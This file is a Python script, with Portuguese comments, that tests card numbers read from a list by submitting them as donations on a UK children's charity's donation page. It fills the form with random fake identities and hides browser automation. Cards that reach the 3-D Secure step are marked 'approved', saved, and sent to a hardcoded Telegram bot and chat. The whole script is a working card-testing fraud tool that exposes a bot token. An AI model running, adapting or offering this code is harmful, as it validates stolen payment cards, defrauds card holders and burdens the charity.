import sys
import os
import requests
import time
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
import random
import re
import multiprocessing
from functools import partial
import string

# --- CONFIGURAÇÕES GLOBAIS ---
os.environ["WDIO_DEBUG"] = "false"
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'

# Definição de cores para terminal
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
RESET = "\033[0m"

# Caminhos de arquivo
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LISTA_TXT_PATH = os.path.join(BASE_DIR, "lista.txt")
APROVADAS_TXT_PATH = os.path.join(BASE_DIR, "aprovadas.txt")

# Credenciais do Telegram
TELEGRAM_TOKEN = "7253379332:AAGQsrVV6m9nmPyYsmyGW7GKBiNxew-NQqM"
TELEGRAM_CHAT_ID = "-1002283109812"

# URL do site
TARGET_URL = "https://www.actionforchildren.org.uk/donate/?amount=10&frequency=single&campaign=235&campaignCode=&appealCode=X24XXXSES&packageCode=&fundCode=&eventCode=&allowRegularDonations=true&minimumMonthlyAmount=300&sliderIndex=0&utm="

# --- FUNÇÕES DE MENU E CONFIGURAÇÃO ---
def exibir_menu_e_obter_escolhas():
    """Exibe um menu para o usuário e retorna as configurações escolhidas."""
    print(f"{YELLOW}--- MENU DE CONFIGURAÇÃO OSIRIS ---{RESET}")

    # 1. Escolha de carregamento de recursos
    while True:
        print(f"\n{YELLOW}Deseja otimizar a velocidade bloqueando imagens e fontes?{RESET}")
        print("1: Sim (Recomendado, mais rápido)")
        print("2: Não (Carregar página completa)")
        escolha_recursos = input("Sua escolha: ")
        if escolha_recursos in ['1', '2']:
            # Converte a escolha para um booleano (True para carregar, False para bloquear)
            carregar_recursos = escolha_recursos == '2'
            break
        else:
            print(f"{RED}Opção inválida. Por favor, digite 1 ou 2.{RESET}")

    # 2. Escolha do número de processos
    while True:
        try:
            print(f"\n{YELLOW}Digite o número de processos paralelos que deseja usar:{RESET}")
            num_processos = int(input("Número de processos: "))
            if num_processos > 0:
                break
            else:
                print(f"{RED}O número de processos deve ser maior que zero.{RESET}")
        except ValueError:
            print(f"{RED}Entrada inválida. Por favor, digite um número inteiro.{RESET}")
            
    print(f"{GREEN}Configurações aplicadas!{RESET}\n")
    return carregar_recursos, num_processos

# --- FUNÇÕES AUXILIARES PARA DADOS ALEATÓRIOS ---
def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def generate_random_name():
    return generate_random_string(random.randint(5, 10)).capitalize()

def generate_random_email():
    return f"{generate_random_string(random.randint(5, 10))}@{generate_random_string(random.randint(4, 7))}.com"

def generate_random_address_part():
    return f"{generate_random_string(random.randint(6, 12)).capitalize()} {random.randint(1, 999)}"

def generate_random_city():
    return generate_random_string(random.randint(5, 10)).capitalize()

# --- FUNÇÕES DE LÓGICA (EXECUTADAS DENTRO DE CADA PROCESSO) ---

def salvar_e_enviar_aprovada(cartao_info, lock):
    """Salva a aprovada no arquivo e envia para o Telegram de forma segura."""
    mensagem_terminal = f"{GREEN}APROVADA | {cartao_info} [OSIRIS VBV]{RESET}"
    mensagem_telegram = cartao_info
    
    # Escreve no arquivo de forma segura usando a trava
    with lock:
        with open(APROVADAS_TXT_PATH, 'a') as file:
            file.write(cartao_info + "\n")

    # Envia para o Telegram
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {'chat_id': TELEGRAM_CHAT_ID, 'text': mensagem_telegram, 'parse_mode': 'HTML'}
    try:
        requests.post(url, params=params, timeout=10)
    except Exception as e:
        print(f"{YELLOW}Aviso: Falha ao enviar notificação para o Telegram: {e}{RESET}")
    
    return mensagem_terminal

def prepare_form_for_payment(page, carregar_recursos):
    """Prepara o formulário para o pagamento, respeitando a escolha de carregar recursos."""
    
    # Configura o bloqueio de recursos com base na escolha do usuário
    if not carregar_recursos:
        print(f"{YELLOW}Otimização ativada: Bloqueando imagens, fontes e CSS.{RESET}")
        def block_unnecessary_resources(route):
            if route.request.resource_type in {"image", "stylesheet", "font"}:
                route.abort()
            else:
                route.continue_()
        page.route("**/*", block_unnecessary_resources)
    else:
        print(f"{YELLOW}Otimização desativada: Carregando todos os recursos da página.{RESET}")

    print(f"{GREEN}Preparando formulário... Navegando para a URL de destino.{RESET}")
    page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)

    try:
        page.locator('xpath=//*[@id="onetrust-accept-btn-handler"]').click(timeout=7000)
        print(f"{YELLOW}Aviso: Banner de cookies não encontrado em 7 segundos. Continuando...{RESET}")
    except PlaywrightTimeoutError:
        print(f"{YELLOW}Aviso: Banner de cookies não encontrado em 7 segundos. Continuando...{RESET}")

    page.locator('xpath=//*[@id="main-content"]/div/section/div/div/div[1]/section/div[2]/ul/li[1]/button').click(timeout=15000)
    
    page.wait_for_selector('xpath=//*[@id="first_name"]', state="visible", timeout=20000)
    
    # Gerando dados aleatórios
    first_name = generate_random_name()
    last_name = generate_random_name()
    email = generate_random_email()
    address_line_1 = generate_random_address_part()
    city = generate_random_city()

    page.locator('xpath=//*[@id="first_name"]').fill(first_name)
    page.locator('xpath=//*[@id="last_name"]').fill(last_name)
    page.locator('xpath=//input[@type="email" and @id="email"]').fill(email)
    page.locator('xpath=//*[@id="id_postal_code"]').fill("68638000") # Mantido fixo para evitar problemas com validação de CEP

    page.locator('xpath=//*[@id="main-content"]/div/section/div/div/div[1]/form/div[1]/div[3]/button').click(timeout=10000)

    page.wait_for_selector('xpath=//*[@id="id_address_line_1"]', state="visible", timeout=15000)

    page.locator('xpath=//*[@id="id_address_line_1"]').fill(address_line_1)
    page.locator('xpath=//*[@id="id_town"]').fill(city)

    page.locator('xpath=//*[@id="id_country"]').select_option(index=33) # Brasil
    page.locator('xpath=//*[@id="title"]').select_option(index=2)      # Mr

    page.locator('xpath=//*[@id="email_consent_no"]').click()
    page.locator('xpath=//*[@id="sms_consent_no"]').click()
    page.locator('xpath=//*[@id="whatsapp_consent_no"]').click()
    
    print(f"{GREEN}Formulário preparado com sucesso.{RESET}")

def processar_cartao(cartao_info, lock, carregar_recursos):
    """Função principal do trabalhador: processa um único cartão."""
    pid = os.getpid()
    cartao, mes, ano, cvv = cartao_info.split('|')
    
    with sync_playwright() as p:
        browser = None
        try:
            browser_args = [
                "--disable-gpu", "--no-sandbox", "--log-level=3", "--disable-webgl",
                "--disable-3d-apis", "--disable-logging", "--disable-blink-features=AutomationControlled",
                "--mute-audio", "--disable-speech-api", "--disable-background-networking",
                "--disable-breakpad", "--disable-component-update", "--disable-domain-reliability",
                "--disable-features=WebRtcHideLocalIpsWithMdns,AudioServiceOutOfProcess,site-per-process",
                "--disable-sync", "--no-pings", "--no-default-browser-check", "--no-first-run",
            ]
            browser = p.chromium.launch(headless=False, args=browser_args)
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()

            prepare_form_for_payment(page, carregar_recursos)

            # Executa o pagamento
            iframe_number_xpath = '//*[@id="braintree-hosted-field-number"]'
            frame_number_locator = page.frame_locator(f"xpath={iframe_number_xpath}")
            frame_number_locator.locator('#credit-card-number').fill(cartao)

            iframe_expiration_xpath = '//*[@id="braintree-hosted-field-expirationDate"]'
            frame_expiration_locator = page.frame_locator(f"xpath={iframe_expiration_xpath}")
            frame_expiration_locator.locator('#expiration').fill(f"{mes}{ano}")

            iframe_cvv_xpath = '//*[@id="braintree-hosted-field-cvv"]'
            frame_cvv_locator = page.frame_locator(f"xpath={iframe_cvv_xpath}")
            frame_cvv_locator.locator('#cvv').fill(cvv)
            
            page.locator('xpath=//*[@id="main-content"]/div/section/div/div/div[1]/form/div[3]/div[3]/button').click(timeout=15000)

            try:
                page.wait_for_selector('xpath=//*[@id="Cardinal-CCA-IFrame"]', state="visible", timeout=25000)
                return salvar_e_enviar_aprovada(cartao_info, lock)
            except PlaywrightTimeoutError:
                return f"{RED}REPROVADA | {cartao_info}{RESET}"

        except Exception as e:
            return f"{RED}ERRO CRÍTICO | {cartao_info} | {e}{RESET}"
        finally:
            if browser:
                browser.close()
            print(f"{YELLOW}Processo {pid} finalizou.{RESET}")

# --- FUNÇÃO PRINCIPAL (PRODUTOR) ---

def main():
    # Exibe o menu e obtém as escolhas do usuário
    carregar_recursos, num_processos = exibir_menu_e_obter_escolhas()

    # Lê a lista de cartões do arquivo
    try:
        with open(LISTA_TXT_PATH, 'r') as file:
            lista_cartoes = [line.strip() for line in file if line.strip()]
        if not lista_cartoes:
            print(f"{YELLOW}O arquivo de lista está vazio.{RESET}")
            return
    except FileNotFoundError:
        print(f"{RED}Erro: Arquivo de lista não encontrado em {LISTA_TXT_PATH}{RESET}")
        return

    print(f"{GREEN}Iniciando processamento de {len(lista_cartoes)} cartões com {num_processos} processos paralelos...{RESET}")

    # Cria uma trava para sincronizar a escrita no arquivo de aprovadas
    manager = multiprocessing.Manager()
    lock = manager.Lock()

    # Cria um pool de processos
    with multiprocessing.Pool(processes=num_processos) as pool:
        # Mapeia a função processar_cartao para a lista de cartões
        # functools.partial é usado para passar argumentos fixos (lock e a escolha de recursos) para cada chamada da função
        worker_func = partial(processar_cartao, lock=lock, carregar_recursos=carregar_recursos)
        resultados = pool.map(worker_func, lista_cartoes)

    # Imprime os resultados
    for res in resultados:
        print(res)

    print(f"{GREEN}Trabalho concluído.{RESET}")

if __name__ == "__main__":
    # Necessário para o multiprocessing funcionar corretamente no Windows
    multiprocessing.freeze_support()
    main()